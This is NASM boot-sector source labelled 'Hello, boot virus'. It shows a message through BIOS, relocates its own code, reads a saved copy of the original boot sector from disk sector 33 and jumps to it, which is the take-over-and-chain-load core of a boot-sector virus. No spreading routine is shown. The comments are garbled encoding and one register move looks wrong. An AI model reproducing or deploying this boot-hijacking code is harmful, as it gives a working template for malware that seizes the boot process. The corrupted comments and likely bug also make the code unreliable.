org 07c00h
times 03eh db 0
mov	ax,cx
mov	ds,ax
mov	es,ax
call	DisStr
jmp	ResumeBoot
DisStr:
	mov	ax, BootMessage
	mov	bp, ax			; ES:BP = ����ַ
	mov	cx, 16			; CX = ������
	mov	ax, 01301h		; AH = 13,  AL = 01h
	mov	bx, 000ch		
	mov	dl, 0
	int	10h			; 10h ���ж�
	ret
BootMessage:		db	"Hello, boot virus"

ResumeBoot:
mov	ax,[SectorNo]
push	ax

mov	di,$$+0200h
mov	si,CopyStart
mov	cx,CopyCount

move:
mov	al,[si]
mov	[di],al
inc	si
inc	di
dec	cx
jnz	move
jmp	$$+0200h

CopyStart:
xor ah, ah ; reset drive
xor dl, dl
int 13h


pop ax;get sector which save the acutal first sector 
mov cl, 1
mov bx, $$
call ReadSector
mov ax, $$
jmp ax; �����ָ�����������ȥִ��,��Ҫֱ����jmp $$��Ϊ��������ƫ�ƣ��������Ǩ�����ƫ����Ҫ�޶���


ReadSector:;�ú����ľ����������Ǵ�0��ʼ��
;ax SectorNO, cl num , bx buf
mov bp, sp
sub sp, 2
push bx
mov byte [bp - 2], cl
mov bl, 18
div bl
inc ah; sectorno
mov cl, ah; set sectorno
mov dh, al
and dh, 1; hdr
shr al, 1
mov ch, al;set track no 
mov dl, 0; drive 0
pop bx
mov ah, 02h; read
mov al, [bp - 2]; read [bp-2] sectors
int 13h
add sp, 2
ret
CopyCount equ $ - CopyStart
SectorNo dw 33




